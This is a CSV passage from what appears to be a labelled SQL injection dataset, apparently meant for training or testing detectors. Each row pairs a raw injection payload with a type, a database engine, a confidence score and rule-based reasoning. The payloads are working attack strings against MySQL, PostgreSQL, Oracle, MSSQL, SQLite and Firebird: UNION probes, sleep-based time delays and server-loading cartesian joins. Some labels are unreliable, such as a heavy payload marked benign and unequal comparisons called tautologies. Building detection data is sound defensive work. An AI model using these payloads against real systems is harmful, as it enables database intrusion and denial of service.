id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
19459,"-4711' in boolean mode ) union all select 8007,8007,8007,8007,8007,8007--",boolean_blind,mysql,0.9,Token match 'in boolean mode' (IN BOOLEAN MODE (mysql fulltext)) → boolean_blind (P3); db=mysql,1
19460,"1%"" ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( ""%"" = """,boolean_blind,generic,0.9,CASE WHEN + tautology 'when ( 2853 = 2853' — boolean_blind inferential (P3); db=generic,3
19461,"-8129' ) ) ) union all select 4531,4531,4531#",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19462,"1"" ) union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19463,"1' ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",boolean_blind,generic,0.9,CASE WHEN + tautology 'when ( 4241 = 4241' — boolean_blind inferential (P3); db=generic,3
19464,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( 3770 = 3770",heavy_query,postgresql,0.85,"Token match 'from domain.domains as t1,domain.' (domain.* cross-join (postgresql)) → heavy_query (P4); db=postgresql",1
19465,1' ) as gogu where 4338 = 4338 union all select null#,union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19466,"-6096' ) where 1316 = 1316 union all select 1316,1316,1316,1316,1316,1316,1316,1316#",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19467,"1, ( select ( case when ( 9644 = 9644 ) then dbms_pipe.receive_message ( chr ( 75 ) ||chr ( 78 ) ||chr ( 104 ) ||chr ( 98 ) ,5 ) else 1/ ( select 0 from dual ) end ) from dual )",time_blind,oracle,0.95,Token match 'dbms_pipe.receive_message' (dbms_pipe.receive_message) → time_blind (P5); db=oracle,3
19468,"1"" ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ""ieuj"" like ""ieuj",boolean_blind,mysql,0.85,Token match 'make_set (' (make_set()) → boolean_blind (P3); db=mysql,2
19469,1 where 2384 = 2384 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,0.85,Token match 'sleep ( 5' (sleep(N)) → time_blind (P5); db=mysql,2
19470,"1%' ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( '%' = '",time_blind,sqlite,0.95,Token match 'randomblob (' (randomblob() → time_blind (P5); db=sqlite,2
19471,"1"" ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19472,"1 ) as mnyy where 4409 = 4409 union all select null,null,null,null--",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19473,"1"" where 9725 = 9725",boolean_blind,generic,0.85,Boolean tautology 'where 9725 = 9725' + injection break (quote/paren break) → boolean_blind (P3); db=generic,2
19474,"-7580' ) ) as mmqt where 3468 = 3468 union all select 3468,3468,3468,3468,3468,3468#",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19475,"1%"" union all select null,null,null,null,null,null--",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19476,"1 ) ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.85,"Token match 'from all_users t1,all_users t2' (all_users t1,t2 cross-join), 'from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5' (5x cartesian join) → heavy_query (P4); db=oracle",1
19477,"1"" ) as ipxg where 4031 = 4031 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,0.95,Token match 'dbms_pipe.receive_message' (dbms_pipe.receive_message) → time_blind (P5); db=oracle,3
19478,"1' ) as jysm where 8961 = 8961 union all select null,null#",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19479,1' ) ) as xcvg where 1157 = 1157 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --,boolean_blind,mysql,0.85,Token match 'rlike (' (RLIKE () → boolean_blind (P3); db=mysql,3
19480,"1"" ) and sleep ( 5 ) and ( ""ytof"" = ""ytof",time_blind,mysql,0.85,Token match 'sleep ( 5' (sleep(N)) → time_blind (P5); db=mysql,2
19481,"1"" ) as pobe where 1704 = 1704",boolean_blind,generic,0.85,Boolean tautology 'where 1704 = 1704' + injection break (quote/paren break) → boolean_blind (P3); db=generic,2
19482,"1"" where 9332 = 9332 union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19483,-2432' ) ) or ( 8459 = 8459 ) *4906 and ( ( 'ejhp' = 'ejhp,boolean_blind,generic,0.85,Boolean tautology 'or ( 8459 = 8459' + injection break (quote/paren break) → boolean_blind (P3); db=generic,2
19484,-8641%' order by 1--,boolean_blind,generic,0.85,Token match 'order by 1--' (ORDER BY N -- probe) → boolean_blind (P3); db=generic,1
19485,"-3249' ) ) ) union all select 6309,6309#",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19486,1' ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( 'yqbo' = 'yqbo,time_blind,mysql,0.85,Token match 'sleep ( 5' (sleep(N)) → time_blind (P5); db=mysql,2
19487,1' ) as nexa where 6740 = 6740,boolean_blind,generic,0.85,Boolean tautology 'where 6740 = 6740' + injection break (quote/paren break) → boolean_blind (P3); db=generic,2
19488,"1"" ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ""rvub"" like ""rvub",heavy_query,firebird,0.85,"Token match 'from rdb$fields as t1,rdb$' (rdb$ cross-join (firebird)) → heavy_query (P4); db=firebird",1
19489,"-7741' ) where 8271 = 8271 union all select 8271,8271,8271,8271,8271,8271,8271#",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19490,"-5009 ) where 8463 = 8463 union all select 8463,8463,8463,8463,8463,8463--",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19491,"1%"" ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ""%"" = """,heavy_query,postgresql,0.85,Token match 'generate_series (' (generate_series()) → heavy_query (P4); db=postgresql,3
19492,1'+ ( select shec where 3589 = 3589 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) ) +',time_blind,postgresql,0.95,Token match 'pg_sleep (' (pg_sleep() → time_blind (P5); db=postgresql,2
19493,"-4305 ) as ldrt where 2567 = 2567 union all select 2567,2567,2567,2567,2567,2567,2567#",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19494,-4322' ) ) as magw where 1627 = 1627 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,boolean_blind,oracle,0.9,CASE WHEN + tautology 'where 1627 = 1627' — boolean_blind inferential (P3); db=oracle,3
19495,"1' and make_set ( 8403 = 8403,8899 ) and 'niux' = 'niux",boolean_blind,mysql,0.85,Token match 'make_set (' (make_set()) → boolean_blind (P3); db=mysql,2
19496,end and ( 4610 = 4610,boolean_blind,generic,0.75,Boolean equality 'and ( 4610 = 4610' tautology pattern — boolean_blind (P3); db=generic,2
19497,"1 ) ) union all select null,null,null--",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19498,1' ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( 'brob' = 'brob,time_blind,mysql,0.85,Token match 'sleep ( 5' (sleep(N)) → time_blind (P5); db=mysql,2
19499,"1'|| ( select 'xjcg' from dual where 5815 = 5815 union all select null,null,null#",union_based,oracle,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=oracle,3
19500,"1' ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( 'fowu' like 'fowu",heavy_query,firebird,0.85,"Token match 'from rdb$fields as t1,rdb$' (rdb$ cross-join (firebird)) → heavy_query (P4); db=firebird",1
19501,1' ) where 5280 = 5280 and 4595 = 4595#,boolean_blind,generic,0.85,Boolean tautology 'where 5280 = 5280' + injection break (comment tail) → boolean_blind (P3); db=generic,3
19502,"1%"" and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.95,Token match 'randomblob (' (randomblob() → time_blind (P5); db=sqlite,2
19503,1 ) where 3565 = 3565 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.95,Token match 'pg_sleep (' (pg_sleep() → time_blind (P5); db=postgresql,2
19504,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( 'kerg' like 'kerg,time_blind,mysql,0.85,Token match 'sleep ( 5' (sleep(N)) → time_blind (P5); db=mysql,2
19505,1' ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ),boolean_blind,mysql,0.9,Token match 'rlike (' (RLIKE () → boolean_blind (P3); db=mysql,3
19506,"1"" where 9760 = 9760 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.95,Token match 'pg_sleep (' (pg_sleep() → time_blind (P5); db=postgresql,2
19507,"1'|| ( select 'vqag' from dual where 8154 = 8154 union all select null,null,null,null,null,null,null,null,null,null--",union_based,oracle,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=oracle,3
19508,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""squx"" like ""squx",heavy_query,mysql,0.85,Token match 'crypt_key (' (crypt_key()) → heavy_query (P4); db=mysql,2
19509,"1"" ) ) ) and 4967 = 8866 and ( ( ( ""jzyn"" like ""jzyn",boolean_blind,generic,0.85,Boolean tautology 'and 4967 = 8866' + injection break (quote/paren break) → boolean_blind (P3); db=generic,3
19510,"1"" ) as oztl where 6655 = 6655 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.85,Boolean tautology 'where 6655 = 6655' + injection break (comment tail) → boolean_blind (P3); db=db2,3
19511,if ( 7899 = 7899 ) select 7899 else drop function zbbp--,boolean_blind,generic,0.55,"Only comment tail detected, no tautology/function — likely simple probe; boolean_blind low-conf (P3); db=generic",3
19512,"1"" ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ""uwdz"" = ""uwdz",boolean_blind,mysql,0.9,CASE WHEN construct + REGEXP — inferential boolean_blind (P3); db=mysql,2
19513,"1'|| ( select 'ativ' from dual where 4746 = 4746 union all select null,null,null,null#",union_based,oracle,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=oracle,3
19514,"1,iif ( 6625 = 6625,1,1/0 )",boolean_blind,generic,0.85,"Token match 'iif ( 6625 = 6625' (iif(N=N,...)) → boolean_blind (P3); db=generic",1
19515,"-9922' ) ) union all select 2193,2193,2193--",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19516,"1"" and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",heavy_query,firebird,0.85,"Token match 'from rdb$fields as t1,rdb$' (rdb$ cross-join (firebird)) → heavy_query (P4); db=firebird",1
19517,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3",heavy_query,postgresql,0.85,"Token match 'from domain.domains as t1,domain.' (domain.* cross-join (postgresql)) → heavy_query (P4); db=postgresql",1
19518,"select count ( * ) from generate_series ( 1,5000000 ) ) ||'",heavy_query,postgresql,0.85,Token match 'generate_series (' (generate_series()) → heavy_query (P4); db=postgresql,3
19519,1' ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( 'uqfs' = 'uqfs,boolean_blind,generic,0.55,"Only quote/paren break detected, no tautology/function — likely simple probe; boolean_blind low-conf (P3); db=generic",3
19520,"-9959"" ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""vcwc"" = ""vcwc",boolean_blind,oracle,0.9,CASE WHEN + tautology 'when ( 4747 = 4747' — boolean_blind inferential (P3); db=oracle,3
19521,"select * from generate_series ( 7610,7610,case when ( 7610 = 9416 ) then 1 else 0 end ) limit 1--",heavy_query,postgresql,0.85,Token match 'generate_series (' (generate_series()) → heavy_query (P4); db=postgresql,1
19522,"1 where 4477 = 4477 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19523,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""yzjl"" like ""yzjl",benign,generic,0.6,"No SQL injection signal (no tautology, no function, no break) — payload appears benign; db=generic",1
19524,"1' ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 'mymg' = 'mymg",boolean_blind,mysql,0.85,"Token match 'elt ( 9067 = 9067' (ELT(N=N,...)) → boolean_blind (P3); db=mysql",2
19525,"1 where 2751 = 2751 union all select null,null,null,null--",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19526,"1%"" ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( ""%"" = """,boolean_blind,mysql,0.9,"Token match 'elt ( 1808 = 1808' (ELT(N=N,...)) → boolean_blind (P3); db=mysql",2
19527,1 ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 3530 = 3530,error_based,oracle,0.95,Token match 'xmltype (' (xmltype() → error_based (P4); db=oracle,2
19528,"1 ) ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.85,Token match 'generate_series (' (generate_series()) → heavy_query (P4); db=postgresql,3
19529,1'|| ( select 'znba' where 8323 = 8323,boolean_blind,generic,0.85,Boolean tautology 'where 8323 = 8323' + injection break (quote/paren break) → boolean_blind (P3); db=generic,3
19530,waitfor delay '0:0:5' and ( ( ( 8981 = 8981,time_blind,mssql,0.95,Token match 'waitfor delay' (WAITFOR DELAY) → time_blind (P5); db=mssql,3
19531,"-6948"" ) ) as ojjl where 1300 = 1300 or 6872 = 6872--",boolean_blind,generic,0.85,Boolean tautology 'where 1300 = 1300' + injection break (comment tail) → boolean_blind (P3); db=generic,3
19532,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( 'bhlx' like 'bhlx",heavy_query,oracle,0.85,"Token match 'from all_users t1,all_users t2' (all_users t1,t2 cross-join), 'from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5' (5x cartesian join) → heavy_query (P4); db=oracle",1
19533,"1"" ) ) as ndbk where 5042 = 5042 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.95,Token match 'pg_sleep (' (pg_sleep() → time_blind (P5); db=postgresql,2
19534,"-1917"" ) or 8571 = 8571--",boolean_blind,generic,0.85,Boolean tautology 'or 8571 = 8571' + injection break (comment tail) → boolean_blind (P3); db=generic,3
19535,"1"" and elt ( 2373 = 5817,5817 ) and ""rsdt"" = ""rsdt",boolean_blind,mysql,0.85,"Token match 'elt ( 2373 = 5817' (ELT(N=N,...)) → boolean_blind (P3); db=mysql",2
19536,1' ) ) ) and ( 8982 = 8027 ) *8027 and ( ( ( 'qkrv' = 'qkrv,boolean_blind,generic,0.85,Boolean tautology 'and ( 8982 = 8027' + injection break (quote/paren break) → boolean_blind (P3); db=generic,2
19537,select ( case when ( 2350 = 8682 ) then 2350 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.9,CASE WHEN + tautology 'when ( 2350 = 8682' — boolean_blind inferential (P3); db=generic,3
19538,select pg_sleep ( 5 ) and ( '%' = ',time_blind,postgresql,0.95,Token match 'pg_sleep (' (pg_sleep() → time_blind (P5); db=postgresql,2
19539,"1' ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( 'yznd' like 'yznd",boolean_blind,mysql,0.9,"Token match 'elt ( 6272 = 6272' (ELT(N=N,...)) → boolean_blind (P3); db=mysql",2
19540,"1'|| ( select 'eayf' where 5431 = 5431 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) ) ||'",boolean_blind,generic,0.85,Boolean tautology 'where 5431 = 5431' + injection break (quote/paren break) → boolean_blind (P3); db=generic,2
19541,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4# ljph",heavy_query,firebird,0.85,"Token match 'from rdb$fields as t1,rdb$' (rdb$ cross-join (firebird)) → heavy_query (P4); db=firebird",1
19542,-3436 ) or 9281 = 3172,boolean_blind,generic,0.75,Boolean equality 'or 9281 = 3172' tautology pattern — boolean_blind (P3); db=generic,3
19543,"-1907"" ) ) or 2782 = 3591",boolean_blind,generic,0.85,Boolean tautology 'or 2782 = 3591' + injection break (quote/paren break) → boolean_blind (P3); db=generic,3
